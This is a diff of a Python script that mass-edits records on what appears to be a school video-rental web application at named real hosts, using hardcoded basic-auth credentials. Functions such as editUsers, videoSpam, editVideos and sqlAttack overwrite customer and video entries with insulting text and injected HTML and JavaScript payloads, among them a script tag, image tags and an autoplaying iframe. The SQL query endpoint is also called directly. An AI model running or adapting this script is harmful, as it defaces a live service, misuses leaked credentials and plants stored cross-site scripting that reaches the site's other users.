@@ -8,17 +8,17 @@ import threading
 import requests
 import itertools
 
-SQL_QUERY_URL = ["http://85.214.224.63/storeAndRouteSQLQuery.php",
+SQL_QUERY_URL = ["http://videocenter2.schule.de/storeAndRouteSQLQuery.php",
 		 "http://130.73.201.41/storeAndRouteSQLQuery.php"]
 SQL_AUTH = requests.auth.HTTPBasicAuth("leit", "tiel")
-ADD_USER_POST_URL = ["http://85.214.224.63/adduser.php?domain=Anmeldung&used_table=kunden",
+ADD_USER_POST_URL = ["http://videocenter2.schule.de/adduser.php?domain=Anmeldung&used_table=kunden",
 		"http://130.73.201.41/adduser.php?domain=Anmeldung&used_table=kunden"]
-EDIT_USER_POST_URL = ["http://85.214.224.63/update2.php?domain=Anmeldung&used_table=kunden",
+EDIT_USER_POST_URL = ["http://videocenter2.schule.de/update2.php?domain=Anmeldung&used_table=kunden",
 		"http://130.73.201.41/update2.php?domain=Anmeldung&used_table=kunden"]
 ADD_USER_AUTH = requests.auth.HTTPBasicAuth("anme", "emna")
-ADD_VIDEO_POST_URL = ["http://85.214.224.63/ein_search.php?domain=Einkauf",
+ADD_VIDEO_POST_URL = ["http://videocenter2.schule.de/ein_search.php?domain=Einkauf",
 		"http://130.73.201.41/ein_search.php?domain=Einkauf"]
-EDIT_VIDEO_POST_URL = ["http://85.214.224.63/update_videos.php?domain=einkauf&used_table=videos%22",
+EDIT_VIDEO_POST_URL = ["http://videocenter2.schule.de/update_videos.php?domain=einkauf&used_table=videos%22",
 		"http://130.73.201.41/update_videos.php?domain=einkauf&used_table=videos%22"]
 ADD_VIDEO_AUTH = requests.auth.HTTPBasicAuth("eink", "knie")
 SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"
@@ -124,7 +124,7 @@ def addFrikas(letters):
 
 def editUsers(minrange, maxrange):
 	for i in range(minrange, maxrange):
-		editUser(i, "xXDaiMuddahHDXx {}".format(i), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "Diese Person ist gefaehrlich, halten sie sie von Essen fern! <img src='http://i0.kym-cdn.com/photos/images/original/000/369/488/61d.jpeg' />")
+		editUser(i, "xXDaiMuddahHDXx {}".format(i), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "<img src=\"https://i.imgur.com/c3Nw01T.png\" />")
 
 def videoSpam(minrange, maxrange):
 	for i in range(minrange, maxrange):
@@ -132,7 +132,7 @@ def videoSpam(minrange, maxrange):
 
 def editVideos(minrange, maxrange):
 	for i in range(minrange, maxrange):
-		editVideo(i, title = "DaiMuddah geht shoppen Teil {}<script type='text/javascript'>window.open('https://youtu.be/oHg5SJYRHA0','_blank')</script>".format(i), director = "Til Schweiger", genre = "Fettsucht hoch {}".format(i/7), length = str(randint(1, 180)), fsk = "35", description = "<img src='http://i0.kym-cdn.com/photos/images/original/000/369/488/61d.jpeg' />", role1 = "DaiMuddah", role2 = "Til Schweiger", role3 = "Felix von den Laeden")
+		editVideo(i, title = "Hairy Pottarsch Teil {}".format(i), director = "Til Schweiger", genre = "Was fuer eins Lustigkeit", length = str(randint(1, 180)), fsk = "37", description = 'You have been Rick Rolled! <iframe width="560" height="315" src="https://www.youtube.com/embed/oHg5SJYRHA0?autoplay=1" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen="1" />', role1 = "Deine Muddah", role2 = "Til Schweiger", role3 = "Danielle Radkliffh")
 
 def sqlAttack():
 	for y in range(0, 10):
